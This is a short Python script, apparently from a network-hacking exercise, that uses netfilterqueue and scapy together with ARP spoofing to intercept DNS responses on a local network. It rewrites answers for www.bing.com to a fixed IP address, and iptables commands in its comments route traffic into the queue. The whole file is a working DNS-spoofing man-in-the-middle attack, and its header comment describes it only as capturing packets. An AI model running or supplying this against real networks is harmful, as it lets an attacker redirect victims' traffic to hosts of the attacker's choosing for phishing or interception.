#!/usr/bin/python

# Capture and print packets going thrue this computerself.
# Run with arp-spoof
#
# To be able to listen to local traffic we need anoter IP-tables filter
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
#
# Flush, remove the config from iptables with
# iptables --flush

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):   # Check for DNS-Response
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in qname:
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata='216.58.211.142')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
            print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Bind the queue to the queue number assigned in the iptables command
                               # And a callback function called process_packet
queue.run()  # Start the queue
